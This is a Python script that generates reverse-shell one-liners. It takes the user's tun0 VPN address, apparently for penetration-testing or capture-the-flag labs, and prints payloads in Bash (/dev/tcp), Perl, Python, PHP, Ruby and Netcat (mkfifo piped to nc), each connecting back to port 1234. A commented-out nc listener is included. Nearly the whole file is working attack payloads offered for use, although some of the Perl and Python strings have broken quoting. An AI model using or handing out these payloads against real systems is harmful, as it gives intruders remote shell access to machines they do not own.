# Written in Python 3 by @Swafox
# CH Credit: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
import os,sys
import optparse 
import socket

# Setting colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
print(f"{bcolors.HEADER}Reverse Shell Cheat Sheet\n")

# Setup parser
parser = optparse.OptionParser(usage = "revshells.py -l [language] -p [1-9999]")
parser.add_option("-l", "--lang", dest="lang", help="Shell type: Bash, Perl, Python, PHP, Ruby, Netcat")

(options, args) = parser.parse_args()

lang = str(options.lang)
lang = lang.lower()

# Getting the tun0
def pull_tun0():
    osout  = str(os.popen("""ip address | grep -sw "inet" | cut -d " " -f 6 | grep 10.*""").read())
    return osout

try:
    tun0 = pull_tun0()
    tun0 = tun0.replace('/16','')
except:
    print(f"{bcolors.BOLD}An error occured!\nExiting...")
    sys.exit()

print("tun0 IP: " + tun0 + "\nPort: 1234")
# Cheat sheet

# Bash
bash = f"bash -i >& /dev/tcp/{tun0}/1234 0>&1"

# PERL
perl = f"perl -e 'use Socket;$i="+tun0+";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("+"tcp"+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+">&S"+");open(STDOUT,"+">&S"+");open(STDERR,"+">&S"+");exec(""+/bin/sh -i"+");};'"

# Python
python = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+tun0+",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["+"/bin/sh"+","+"-i"+"]);' "

# PHP
php = f"php -r '$sock=fsockopen("+tun0+",1234);exec("+"/bin/sh -i <&3 >&3 2>&3"+");'"

# Ruby
ruby = f"ruby -rsocket -e'f=TCPSocket.open("+tun0+",1234).to_i;exec sprintf("+"/bin/sh -i <&%d >&%d 2>&%d"+",f,f,f)'"

# Netcat
netcat = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {tun0} 1234 >/tmp/f"


if (lang == "bash"):
    print(bash)
if (lang == "perl"):
    print(perl)
if (lang == "python"):
    print(python)
if (lang == "php"):
    print(php)
if (lang == "ruby"):
    print(ruby)
if (lang == "netcat" or lang == "nc"):
    print(netcat)

# Listener
'''
if (1 == 1):
    print("Setting up listener on port 1234...")
    import pty
    pty.spawn("nc -lnvp 1234")

else:
    sys.exit()
'''
